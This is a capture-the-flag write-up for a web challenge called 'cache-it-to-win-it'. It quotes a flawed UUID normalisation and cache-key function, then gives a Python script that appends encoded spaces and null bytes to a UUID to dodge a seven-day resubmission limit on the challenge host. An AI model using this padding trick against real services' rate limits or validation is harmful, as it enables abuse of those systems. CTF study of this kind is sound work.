## Overview

The target website has a vulnerability in how it processes UUIDs. The UUID normalization function removes dashes and replaces them with spaces but does not handle whitespaces properly. This allows us to bypass validation by adding encoded spaces.

### Vulnerable Code

The function `normalize_uuid` removes `-` and replaces them with spaces:

```python
def normalize_uuid(uuid: str):
    uuid_l = list(uuid)
    i = 0
    for i in range(len(uuid)):
        uuid_l[i] = uuid_l[i].upper()
        if uuid_l[i] == "-":
            uuid_l.pop(i)
            uuid_l.append(" ")
    
    return "".join(uuid_l)
```

The cache key is generated like this:

```python
def make_cache_key():
    return f"GET_check_uuids:{normalize_uuid(request.args.get('uuid'))}"[:64]
```

Since the validation does not properly check for whitespaces, we can append encoded spaces (`%20`, `%00`) to bypass it.

### Exploit

The following script generates different combinations of `%20` and `%00` and appends them to the UUID:

```python
import requests

def generate_combination(i):
    binary_str = bin(i)[2:]
    combination = ''.join('%00' if bit == '0' else '%20' for bit in binary_str)
    return combination

def main():
    uuid = '4ef4332c-3bf4-4c4b-a88a-fecfe9cee647' # actual uuid
    url = 'https://cache-it-to-win-it.chall.lac.tf/check?uuid=' + uuid

    for i in range(100):
        new_url = url + generate_combination(i)
        response = requests.get(new_url)
        print(f"Testing: {new_url}\nStatus Code: {response.status_code}\nResponse: {response.text}\n")

if __name__ == "__main__":
    main()
```

This way, we can submit the same UUID 100 times without waiting for the 7-day timeout period, potentially allowing us to obtain the flag.

